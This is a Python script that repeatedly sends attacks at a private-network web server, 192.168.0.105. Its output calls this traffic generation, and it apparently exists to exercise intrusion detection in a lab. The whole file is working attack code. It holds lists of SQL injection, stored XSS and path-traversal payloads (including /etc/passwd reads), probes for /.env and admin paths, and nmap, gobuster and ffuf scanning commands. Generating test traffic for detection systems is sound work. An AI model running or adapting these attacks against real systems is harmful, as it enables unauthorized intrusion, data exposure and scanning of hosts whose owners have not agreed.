#!/usr/bin/env python3

import random
import shutil
import subprocess
import time
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "192.168.0.105"
HTTP_URL = f"http://{TARGET}"
HTTPS_URL = f"https://{TARGET}"

WORDLIST = Path("/usr/share/wordlists/dirb/common.txt")
ATTACK_INTERVAL = 3
REQUEST_TIMEOUT = 5

SQLI_PAYLOADS = [
    "' OR 1=1 -- ",
    "' OR '1'='1",
    "admin' #",
    "1' UNION SELECT 1,2,3 -- ",
]

PRODUCT_SQLI_PAYLOADS = [
    "1 OR 1=1",
    "0 OR 1=1",
    "1 AND 1=2",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    '\"><img src=x onerror=alert(1)>',
    "<svg/onload=alert('XSS')>",
]

PATH_TRAVERSAL_PATHS = [
    "/%2e%2e/%2e%2e/etc/passwd",
    "/..%2f..%2f..%2fetc/passwd",
    "/products.php?id=../../../../etc/passwd",
]

SUSPICIOUS_PATHS = [
    "/admin",
    "/administrator",
    "/wp-admin",
    "/phpmyadmin",
    "/.env",
    "/backup",
    "/config",
    "/server-status",
]

SESSION = requests.Session()


def send_request(method, base_url, path, params=None, data=None):
    url = f"{base_url}{path}"

    try:
        response = SESSION.request(
            method=method,
            url=url,
            params=params,
            data=data,
            verify=False,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=False,
        )

        print(
            f"{method} {response.request.url} "
            f"-> HTTP {response.status_code}"
        )

    except requests.RequestException as error:
        print(f"Request failed: {error}")


def run_command(name, command, timeout=60):
    print(f"Running command: {name}")

    try:
        subprocess.run(
            command,
            check=False,
            timeout=timeout,
        )

    except FileNotFoundError:
        print(f"Command not found: {command[0]}")

    except subprocess.TimeoutExpired:
        print(f"Command timed out: {name}")


def attack_sql_injection():
    attack_case = random.choice([
        "user_search",
        "product_lookup",
        "comment_submission",
    ])

    base_url = random.choice([HTTP_URL, HTTPS_URL])

    if attack_case == "user_search":
        payload = random.choice(SQLI_PAYLOADS)

        send_request(
            "GET",
            base_url,
            "/search.php",
            params={"q": payload},
        )

    elif attack_case == "product_lookup":
        payload = random.choice(PRODUCT_SQLI_PAYLOADS)

        send_request(
            "GET",
            base_url,
            "/products.php",
            params={"id": payload},
        )

    else:
        payload = random.choice(SQLI_PAYLOADS)

        send_request(
            "POST",
            base_url,
            "/comments.php",
            data={
                "username": "sqli_bot",
                "comment": payload,
            },
        )


def attack_stored_xss():
    payload = random.choice(XSS_PAYLOADS)
    base_url = random.choice([HTTP_URL, HTTPS_URL])

    send_request(
        "POST",
        base_url,
        "/comments.php",
        data={
            "username": "xss_bot",
            "comment": payload,
        },
    )


def attack_path_traversal():
    base_url = random.choice([HTTP_URL, HTTPS_URL])
    path = random.choice(PATH_TRAVERSAL_PATHS)

    if path.startswith("/products.php"):
        send_request(
            "GET",
            base_url,
            "/products.php",
            params={"id": "../../../../etc/passwd"},
        )
    else:
        send_request(
            "GET",
            base_url,
            path,
        )


def attack_icmp():
    if not shutil.which("ping"):
        print("Skipping ICMP test: ping is not installed.")
        return

    run_command(
        "ICMP probing",
        ["ping", "-c", "5", "-W", "1", TARGET],
        timeout=10,
    )


def attack_tcp_scan():
    if not shutil.which("nmap"):
        print("Skipping TCP scan: nmap is not installed.")
        return

    run_command(
        "TCP port scan",
        [
            "nmap",
            "-sT",
            "-T3",
            "-p",
            "1-1000",
            TARGET,
        ],
        timeout=60,
    )


def attack_service_detection():
    if not shutil.which("nmap"):
        print("Skipping service detection: nmap is not installed.")
        return

    run_command(
        "Service version detection",
        [
            "nmap",
            "-sV",
            "-T3",
            "-p",
            "80,443",
            TARGET,
        ],
        timeout=60,
    )


def attack_directory_enumeration(base_url, protocol):
    if not shutil.which("gobuster"):
        print("Skipping directory enumeration: gobuster is not installed.")
        return

    if not WORDLIST.is_file():
        print(f"Skipping directory enumeration: {WORDLIST} was not found.")
        return

    command = [
        "gobuster",
        "dir",
        "-u",
        base_url,
        "-w",
        str(WORDLIST),
        "-t",
        "5",
        "-q",
    ]

    if protocol == "https":
        command.append("-k")

    run_command(
        f"{protocol.upper()} directory enumeration",
        command,
        timeout=45,
    )


def attack_http_directory_enumeration():
    attack_directory_enumeration(HTTP_URL, "http")


def attack_https_directory_enumeration():
    attack_directory_enumeration(HTTPS_URL, "https")


def attack_http_fuzzing():
    if not shutil.which("ffuf"):
        print("Skipping HTTP fuzzing: ffuf is not installed.")
        return

    if not WORDLIST.is_file():
        print(f"Skipping HTTP fuzzing: {WORDLIST} was not found.")
        return

    run_command(
        "HTTP URL fuzzing",
        [
            "ffuf",
            "-u",
            f"{HTTP_URL}/FUZZ",
            "-w",
            str(WORDLIST),
            "-t",
            "5",
            "-maxtime",
            "20",
            "-mc",
            "all",
            "-fs",
            "0",
            "-s",
        ],
        timeout=25,
    )


def attack_https_fuzzing():
    if not shutil.which("ffuf"):
        print("Skipping HTTPS fuzzing: ffuf is not installed.")
        return

    if not WORDLIST.is_file():
        print(f"Skipping HTTPS fuzzing: {WORDLIST} was not found.")
        return

    run_command(
        "HTTPS URL fuzzing",
        [
            "ffuf",
            "-u",
            f"{HTTPS_URL}/FUZZ",
            "-w",
            str(WORDLIST),
            "-t",
            "5",
            "-maxtime",
            "20",
            "-mc",
            "all",
            "-fs",
            "0",
            "-s",
            "-k",
        ],
        timeout=25,
    )


def attack_suspicious_http_request(base_url, protocol):
    path = random.choice(SUSPICIOUS_PATHS)

    print(f"{protocol.upper()} suspicious path probe")

    send_request(
        "GET",
        base_url,
        path,
    )


def attack_http_probes():
    attack_suspicious_http_request(HTTP_URL, "http")


def attack_https_probes():
    attack_suspicious_http_request(HTTPS_URL, "https")


def build_attack_list():
    attacks = [
        ("SQL injection", attack_sql_injection),
        ("Stored XSS", attack_stored_xss),
        ("Path traversal", attack_path_traversal),
        ("HTTP suspicious request", attack_http_probes),
        ("HTTPS suspicious request", attack_https_probes),
    ]

    if shutil.which("ping"):
        attacks.append(("ICMP probing", attack_icmp))

    if shutil.which("nmap"):
        attacks.extend([
            ("TCP port scan", attack_tcp_scan),
            ("Service version detection", attack_service_detection),
        ])

    if shutil.which("gobuster") and WORDLIST.is_file():
        attacks.extend([
            ("HTTP directory enumeration", attack_http_directory_enumeration),
            ("HTTPS directory enumeration", attack_https_directory_enumeration),
        ])

    if shutil.which("ffuf") and WORDLIST.is_file():
        attacks.extend([
            ("HTTP URL fuzzing", attack_http_fuzzing),
            ("HTTPS URL fuzzing", attack_https_fuzzing),
        ])

    return attacks


def main():
    attacks = build_attack_list()

    print(f"Target: {TARGET}")
    print(f"Available attack categories: {len(attacks)}")
    print(f"Delay between tests: {ATTACK_INTERVAL} seconds")
    print("Continuous traffic generation started. Press CTRL+C to stop.")

    try:
        while True:
            attack_name, attack_function = random.choice(attacks)

            print()
            print("=" * 50)
            print(f"ATTACK: {attack_name}")
            print("=" * 50)

            try:
                attack_function()

            except requests.RequestException as error:
                print(f"Request failed: {error}")

            except Exception as error:
                print(f"Attack failed: {error}")

            time.sleep(ATTACK_INTERVAL)

    except KeyboardInterrupt:
        print("\nTraffic generation stopped.")


if __name__ == "__main__":
    main()